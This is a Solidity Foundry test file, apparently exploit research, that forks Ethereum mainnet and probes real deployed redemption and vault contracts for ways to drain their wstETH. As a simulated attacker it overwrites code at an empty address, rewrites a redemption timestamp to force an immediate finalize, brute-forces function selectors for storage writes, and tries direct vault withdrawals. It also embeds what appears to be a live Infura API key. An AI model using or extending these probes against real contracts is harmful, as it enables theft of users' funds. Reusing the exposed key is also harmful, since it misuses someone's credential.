// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
    function allowance(address, address) external view returns (uint256);
}

/**
 * EMPTY IAU EXPLOIT
 *
 * IAU (0xEf69713F639130B6F0D4A12a11E2169a4d1bD52a) has NO CODE
 *
 * When RC calls an empty address:
 * - CALL/STATICCALL to empty address returns success (true)
 * - No code executes
 * - This might bypass validation checks!
 *
 * If RC does: if(IAU.someCheck()) { ... }
 * And IAU is empty, the check returns 0/false, but the call succeeds
 * This could skip validation paths!
 */
contract EmptyIAUExploit is Test {
    address constant R0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant RC = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant TASSET = 0xD11c452fc99cF405034ee446803b6F6c1F6d5ED8;
    address constant IAU = 0xEf69713F639130B6F0D4A12a11E2169a4d1bD52a;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_EmptyAddressCallBehavior() public {
        console.log("=== EMPTY ADDRESS CALL BEHAVIOR ===\n");

        // When calling empty address:
        // - CALL returns true (success)
        // - Return data is empty (length 0)
        // - If decoded as bool/uint, it's 0/false

        (bool success, bytes memory data) = IAU.call(abi.encodeWithSignature("anyFunction()"));
        console.log("Call success:", success);
        console.log("Return data length:", data.length);

        // This means if RC checks: IAU.call(...) returns (success, data)
        // success = true, data = empty
        // If RC does: if (!success) revert -> won't revert
        // If RC does: require(abi.decode(data, (bool))) -> will fail (data too short)

        // What if RC uses low-level call with length check?
        // success && data.length == 0 is the empty address signature
    }

    function test_DeployCodeAtIAU() public {
        console.log("=== DEPLOY CODE AT IAU ===\n");

        // Can we deploy code at the IAU address?
        // Only if we know the creation parameters (CREATE2)

        // Check if IAU address looks like CREATE2
        // CREATE2: keccak256(0xff ++ deployer ++ salt ++ keccak256(bytecode))[12:]

        console.log("IAU address:", IAU);

        // We can't easily deploy at this address without knowing the salt
        // But let's check if anyone can deploy there

        // Actually, we CAN use vm.etch in test to simulate code deployment
        // This is useful for understanding the vulnerability even if not exploitable in practice

        bytes memory maliciousCode = hex"600160005260206000F3"; // Returns 1 (true)
        vm.etch(IAU, maliciousCode);

        console.log("Code deployed at IAU, size:", IAU.code.length);

        // Now test if R0 behavior changes
        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault wstETH before:", vaultBefore / 1e18);

        deal(TASSET, attacker, 10000e18);

        vm.startPrank(attacker);
        IERC20(TASSET).approve(R0, type(uint256).max);

        // Try redeem with modified IAU
        R0.call(abi.encodeWithSignature("redeem(uint96)", uint96(1000e18)));

        // Immediate finalize
        (bool success,) = R0.call(abi.encodeWithSignature("finalizeRedeem(uint256)", 0));
        console.log("Immediate finalize success:", success);

        vm.stopPrank();

        console.log("Attacker wstETH:", IERC20(wstETH).balanceOf(attacker) / 1e18);
    }

    function test_AnalyzeRCSlot5Usage() public {
        console.log("=== ANALYZE RC SLOT 5 USAGE ===\n");

        // RC reads slot 5 as IAU address
        // When does RC use this?

        // Slot 5 in the delegatecall context is R0's slot 5
        bytes32 r0Slot5 = vm.load(R0, bytes32(uint256(5)));
        console.log("R0 slot 5 (mapping base):");
        console.logBytes32(r0Slot5);

        bytes32 rcSlot5 = vm.load(RC, bytes32(uint256(5)));
        console.log("RC slot 5 (IAU):");
        console.logBytes32(rcSlot5);

        // When R0 delegatecalls RC:
        // - RC reads from R0's storage, NOT its own
        // - So IAU address in RC's storage is NEVER used during delegatecall!

        // RC only uses its own storage when called directly (which fails)

        // But what if we call RC in a way that confuses storage?
    }

    function test_StorageContextSwitch() public {
        console.log("=== STORAGE CONTEXT SWITCH ===\n");

        // Delegatecall chain analysis:
        // User -> R0 -> delegatecall -> RC (in R0's storage context)

        // What if RC internally delegatecalls to another contract?
        // Then storage context switches again?

        // Check if RC has delegatecall
        bytes memory rcCode = RC.code;
        uint delegatecallCount = 0;
        for (uint i = 0; i < rcCode.length; i++) {
            if (uint8(rcCode[i]) == 0xF4) {
                console.log("DELEGATECALL at offset:", i);
                delegatecallCount++;
            }
        }
        console.log("Total DELEGATECALL:", delegatecallCount);

        // If RC has delegatecall, what does it delegatecall to?
        // Usually loaded from storage

        // In R0's context, RC reads storage from R0
        // So if RC does: delegatecall(storage[X]), it uses R0's storage[X]
    }

    function test_ManipulateR0Slot5() public {
        console.log("=== MANIPULATE R0 SLOT 5 ===\n");

        // R0's slot 5 is used as mapping base for redemptions
        // But what if the value at slot 5 could be interpreted differently?

        bytes32 slot5 = vm.load(R0, bytes32(uint256(5)));
        console.log("R0 slot 5:");
        console.logBytes32(slot5);

        // If slot 5 = 0, keccak256(user, 5) gives user's redemption array slot
        // The actual redemptions are stored at: keccak256(keccak256(user, 5)) + index

        // Can we manipulate slot 5 to point to attacker-controlled storage?

        // First, create a redemption to see what storage is used
        deal(TASSET, attacker, 10000e18);

        vm.startPrank(attacker);
        IERC20(TASSET).approve(R0, type(uint256).max);
        R0.call(abi.encodeWithSignature("redeem(uint96)", uint96(1000e18)));
        vm.stopPrank();

        // Calculate storage locations
        bytes32 arrayLengthSlot = keccak256(abi.encode(attacker, uint256(5)));
        bytes32 arrayBaseSlot = keccak256(abi.encode(arrayLengthSlot));

        console.log("\nAttacker's redemption storage:");
        console.log("Array length slot:");
        console.logBytes32(arrayLengthSlot);
        console.log("Array base slot:");
        console.logBytes32(arrayBaseSlot);

        // Read the actual redemption data
        bytes32 redemption0 = vm.load(R0, arrayBaseSlot);
        console.log("\nRedemption 0 data:");
        console.logBytes32(redemption0);

        // If we could write to arrayBaseSlot directly, we could set timestamp=0
    }

    function test_FinalizeWithManipulatedTimestamp() public {
        console.log("=== FINALIZE WITH MANIPULATED TIMESTAMP ===\n");

        deal(TASSET, attacker, 10000e18);

        vm.startPrank(attacker);
        IERC20(TASSET).approve(R0, type(uint256).max);
        R0.call(abi.encodeWithSignature("redeem(uint96)", uint96(1000e18)));
        vm.stopPrank();

        // Calculate storage slot for redemption
        bytes32 arrayLengthSlot = keccak256(abi.encode(attacker, uint256(5)));
        bytes32 arrayBaseSlot = keccak256(abi.encode(arrayLengthSlot));

        // Read current redemption
        bytes32 redemptionData = vm.load(R0, arrayBaseSlot);
        console.log("Original redemption:");
        console.logBytes32(redemptionData);

        // Manipulate: set timestamp to 0 (or very old)
        // Redemption struct likely: { amount: uint96, timestamp: uint64, ... }
        // Let's set the entire thing to just amount

        uint96 amount = 1000e18;
        bytes32 manipulated = bytes32(uint256(amount)); // Only amount, timestamp=0

        vm.store(R0, arrayBaseSlot, manipulated);

        console.log("Manipulated redemption:");
        console.logBytes32(vm.load(R0, arrayBaseSlot));

        // Try immediate finalize
        uint256 attackerBefore = IERC20(wstETH).balanceOf(attacker);

        vm.startPrank(attacker);
        (bool success,) = R0.call(abi.encodeWithSignature("finalizeRedeem(uint256)", 0));
        console.log("Finalize success:", success);
        vm.stopPrank();

        uint256 attackerAfter = IERC20(wstETH).balanceOf(attacker);
        console.log("\nAttacker wstETH gained:", (attackerAfter - attackerBefore) / 1e18);

        if (attackerAfter > attackerBefore) {
            console.log("\n*** IMMEDIATE DRAIN POSSIBLE IF WE CAN WRITE STORAGE! ***");
        }
    }

    function test_FindStorageWriteVector() public {
        console.log("=== FIND STORAGE WRITE VECTOR ===\n");

        // The exploit is possible IF we can write to R0's storage
        // Specifically, write to redemption timestamp slot

        // Vectors to explore:
        // 1. Delegatecall to attacker-controlled code
        // 2. Storage collision
        // 3. Uninitialized proxy
        // 4. Timelock execution of pending tx

        // Check if R0 has any function that writes arbitrary storage
        bytes4[] memory sigs = new bytes4[](10);
        sigs[0] = bytes4(keccak256("setStorage(bytes32,bytes32)"));
        sigs[1] = bytes4(keccak256("store(bytes32,bytes32)"));
        sigs[2] = bytes4(keccak256("writeSlot(uint256,bytes32)"));
        sigs[3] = bytes4(keccak256("sstore(bytes32,bytes32)"));
        sigs[4] = bytes4(keccak256("batch(bytes[])"));
        sigs[5] = bytes4(keccak256("multicall(bytes[])"));
        sigs[6] = bytes4(keccak256("execute(address,bytes)"));
        sigs[7] = bytes4(keccak256("delegateCall(address,bytes)"));
        sigs[8] = bytes4(keccak256("fallback()"));
        sigs[9] = bytes4(keccak256("receive()"));

        vm.startPrank(attacker);
        console.log("Testing storage write functions...");
        for (uint i = 0; i < sigs.length; i++) {
            (bool s,) = R0.call(abi.encodeWithSelector(sigs[i], bytes32(uint256(5)), bytes32(uint256(1))));
            if (s) {
                console.log("Selector %d success!", i);
                console.logBytes4(sigs[i]);
            }
        }
        vm.stopPrank();
    }

    function test_VaultDirectWithdraw() public {
        console.log("=== VAULT DIRECT WITHDRAW ===\n");

        // The vault has wstETH
        // RC has unlimited allowance from vault

        // What if we can call vault directly?
        console.log("Vault:", VAULT);
        console.log("Vault wstETH:", IERC20(wstETH).balanceOf(VAULT) / 1e18);

        // Check vault's withdraw functions
        vm.startPrank(attacker);

        (bool s1,) = VAULT.call(abi.encodeWithSignature("withdraw(uint256)", 1000e18));
        console.log("withdraw(amount):", s1);

        (bool s2,) = VAULT.call(abi.encodeWithSignature("withdraw(uint256,address)", 1000e18, attacker));
        console.log("withdraw(amount,to):", s2);

        (bool s3,) = VAULT.call(abi.encodeWithSignature("redeem(uint256)", 1000e18));
        console.log("redeem(shares):", s3);

        (bool s4,) = VAULT.call(abi.encodeWithSignature("exit()"));
        console.log("exit():", s4);

        vm.stopPrank();

        console.log("Attacker wstETH:", IERC20(wstETH).balanceOf(attacker) / 1e18);
    }

    function test_VaultFunctionScan() public {
        console.log("=== VAULT FUNCTION SCAN ===\n");

        console.log("VAULT code size:", VAULT.code.length);

        // Scan for interesting function selectors
        bytes4[] memory sigs = new bytes4[](30);
        sigs[0] = bytes4(keccak256("owner()"));
        sigs[1] = bytes4(keccak256("admin()"));
        sigs[2] = bytes4(keccak256("paused()"));
        sigs[3] = bytes4(keccak256("deposit(uint256,address)"));
        sigs[4] = bytes4(keccak256("withdraw(uint256,address,address)"));
        sigs[5] = bytes4(keccak256("redeem(uint256,address,address)"));
        sigs[6] = bytes4(keccak256("transfer(address,uint256)"));
        sigs[7] = bytes4(keccak256("transferFrom(address,address,uint256)"));
        sigs[8] = bytes4(keccak256("approve(address,uint256)"));
        sigs[9] = bytes4(keccak256("allowance(address,address)"));
        sigs[10] = bytes4(keccak256("balanceOf(address)"));
        sigs[11] = bytes4(keccak256("totalSupply()"));
        sigs[12] = bytes4(keccak256("asset()"));
        sigs[13] = bytes4(keccak256("totalAssets()"));
        sigs[14] = bytes4(keccak256("convertToShares(uint256)"));
        sigs[15] = bytes4(keccak256("convertToAssets(uint256)"));
        sigs[16] = bytes4(keccak256("maxDeposit(address)"));
        sigs[17] = bytes4(keccak256("maxWithdraw(address)"));
        sigs[18] = bytes4(keccak256("maxRedeem(address)"));
        sigs[19] = bytes4(keccak256("previewDeposit(uint256)"));
        sigs[20] = bytes4(keccak256("previewWithdraw(uint256)"));
        sigs[21] = bytes4(keccak256("previewRedeem(uint256)"));
        sigs[22] = bytes4(keccak256("withdraw(uint256,address,address,uint256)"));
        sigs[23] = bytes4(keccak256("redeem(uint256,address,address,uint256)"));
        sigs[24] = bytes4(keccak256("mint(uint256,address)"));
        sigs[25] = bytes4(keccak256("burn(uint256,address)"));
        sigs[26] = bytes4(keccak256("sweep(address,uint256)"));
        sigs[27] = bytes4(keccak256("rescue(address,uint256)"));
        sigs[28] = bytes4(keccak256("emergencyWithdraw()"));
        sigs[29] = bytes4(keccak256("setRedemption(address)"));

        console.log("Testing vault functions...");
        for (uint i = 0; i < sigs.length; i++) {
            (bool s, bytes memory d) = VAULT.staticcall(abi.encodeWithSelector(sigs[i]));
            if (s && d.length > 0) {
                console.log("View function %d works", i);
            }
        }

        // Try write functions as attacker
        vm.startPrank(attacker);
        for (uint i = 0; i < sigs.length; i++) {
            (bool s,) = VAULT.call{gas: 100000}(abi.encodeWithSelector(sigs[i], attacker, 1000e18, attacker, 0));
            if (s) {
                console.log("Write function %d worked!", i);
            }
        }
        vm.stopPrank();
    }
}
